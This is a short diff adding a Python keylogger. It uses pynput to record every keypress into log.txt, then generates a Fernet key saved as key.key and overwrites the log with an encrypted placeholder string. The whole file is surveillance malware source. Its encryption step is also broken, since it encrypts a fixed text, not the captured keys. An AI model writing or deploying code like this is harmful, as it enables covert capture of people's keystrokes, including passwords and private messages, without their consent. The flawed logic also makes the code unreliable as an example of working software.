@@ -1,0 +1,44 @@
+from pynput.keyboard import Listener
+
+
+def writetofile(key):
+    keydata = str(key)
+    keydata = keydata.replace("'","")
+
+    if keydata == 'Key.space':
+        keydata = ' '
+    if keydata == 'Key.shift':
+        keydata = ''   
+    if keydata == "Key.ctrl_l":
+        keydata = ""
+    if keydata == "Key.enter":
+        keydata = "\n"
+    if keydata == "Key.backspace":
+        keydata = ""
+
+    with open("log.txt",'a') as f:
+        f.write(keydata)
+
+with Listener(on_press=writetofile) as l:
+    l.join()
+
+
+
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+with open("key.key", "wb") as key_file:
+    key_file.write(key)
+
+
+with open("key.key", "rb") as key_file:
+    key = key_file.read()
+
+cipher_suite = Fernet(key)
+
+
+log_data = "Captured keystrokes..."
+encrypted_data = cipher_suite.encrypt(log_data.encode())
+
+with open("log.txt", "wb") as log_file:
+    log_file.write(encrypted_data)
